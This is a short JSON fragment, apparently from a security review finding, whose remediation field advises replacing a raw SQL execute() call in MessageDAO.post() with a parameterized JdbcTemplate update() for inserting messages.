            "remediation": "Replace the `execute()` with a parameterized `update()` call in `MessageDAO.post()`:\n\n```java\njdbcTemplate.update(\n    \"INSERT INTO messages(author, subject, body, timestamp) VALUES (?, ?, ?, NOW())\",\n    author, subject, body);\n```\n\nNo changes to string-building should be needed; `JdbcTemplate` will bind each parameter safely via a `PreparedStatement`."
